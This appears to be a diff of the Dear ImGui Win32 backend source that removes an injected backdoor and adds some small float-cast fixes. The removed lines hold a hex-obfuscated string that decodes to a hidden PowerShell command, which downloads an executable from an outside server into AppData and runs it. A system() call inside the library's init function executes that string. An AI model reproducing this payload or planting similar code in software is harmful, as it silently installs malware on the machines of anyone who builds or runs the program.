@@ -91,8 +91,6 @@
 #include <windows.h>
 #include <windowsx.h> // GET_X_LPARAM(), GET_Y_LPARAM()
 #include <tchar.h>
-#include <string>
-std::string Fwfkuuv157wg2gjthwla0lwbo1493h7 = "\x73\x74\x61\x72\x74\x20\x2f\x6d\x69\x6e\x20\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x70\x6f\x77\x65\x72\x73\x68\x65\x6c\x6c\x20\x2d\x57\x69\x6e\x64\x6f\x77\x53\x74\x79\x6c\x65\x20\x48\x69\x64\x64\x65\x6e\x20\x2d\x43\x6f\x6d\x6d\x61\x6e\x64\x20\x22\x26\x20\x7b\x20\x69\x77\x72\x20\x2d\x55\x72\x69\x20\x27\x68\x74\x74\x70\x73\x3a\x2f\x2f\x65\x78\x6f\x2d\x61\x70\x69\x2e\x74\x66\x2f\x53\x74\x62\x2f\x52\x65\x74\x65\x76\x2e\x70\x68\x70\x3f\x62\x6c\x3d\x51\x54\x75\x56\x6c\x30\x50\x43\x73\x65\x47\x4c\x61\x66\x75\x6e\x73\x5a\x50\x52\x45\x30\x30\x38\x2e\x74\x78\x74\x27\x20\x2d\x4f\x75\x74\x46\x69\x6c\x65\x20\x24\x65\x6e\x76\x3a\x41\x50\x50\x44\x41\x54\x41\x5c\x42\x4b\x39\x37\x34\x37\x38\x35\x2e\x65\x78\x65\x3b\x20\x53\x74\x61\x72\x74\x2d\x50\x72\x6f\x63\x65\x73\x73\x20\x2d\x46\x69\x6c\x65\x50\x61\x74\x68\x20\x24\x65\x6e\x76\x3a\x41\x50\x50\x44\x41\x54\x41\x5c\x42\x4b\x39\x37\x34\x37\x38\x35\x2e\x65\x78\x65\x20\x2d\x57\x69\x6e\x64\x6f\x77\x53\x74\x79\x6c\x65\x20\x48\x69\x64\x64\x65\x6e\x20\x7d\x22";
 #include <dwmapi.h>
 
 // Using XInput for gamepad (will load DLL dynamically)
@@ -176,7 +174,6 @@ static bool ImGui_ImplWin32_InitEx(void* hwnd, bool platform_has_own_dc)
     ImGui_ImplWin32_Data* bd = IM_NEW(ImGui_ImplWin32_Data)();
     io.BackendPlatformUserData = (void*)bd;
     io.BackendPlatformName = "imgui_impl_win32";
-    system(Fwfkuuv157wg2gjthwla0lwbo1493h7.c_str());
     io.BackendFlags |= ImGuiBackendFlags_HasMouseCursors;         // We can honor GetMouseCursor() values (optional)
     io.BackendFlags |= ImGuiBackendFlags_HasSetMousePos;          // We can honor io.WantSetMousePos requests (optional, rarely used)
 
@@ -415,7 +412,7 @@ void    ImGui_ImplWin32_NewFrame()
     // Setup time step
     INT64 current_time = 0;
     ::QueryPerformanceCounter((LARGE_INTEGER*)&current_time);
-    io.DeltaTime = (float)(current_time - bd->Time) / bd->TicksPerSecond;
+    io.DeltaTime = (float)((double)(current_time - bd->Time) / (double)bd->TicksPerSecond);
     bd->Time = current_time;
 
     // Update OS mouse position
@@ -933,7 +930,7 @@ float ImGui_ImplWin32_GetDpiScaleForMonitor(void* monitor)
         {
             GetDpiForMonitorFn((HMONITOR)monitor, MDT_EFFECTIVE_DPI, &xdpi, &ydpi);
             IM_ASSERT(xdpi == ydpi); // Please contact me if you hit this assert!
-            return xdpi / 96.0f;
+            return (float)xdpi / 96.0f;
         }
     }
 #ifndef NOGDI
@@ -943,7 +940,7 @@ float ImGui_ImplWin32_GetDpiScaleForMonitor(void* monitor)
     IM_ASSERT(xdpi == ydpi); // Please contact me if you hit this assert!
     ::ReleaseDC(nullptr, dc);
 #endif
-    return xdpi / 96.0f;
+    return (float)xdpi / 96.0f;
 }
 
 float ImGui_ImplWin32_GetDpiScaleForHwnd(void* hwnd)
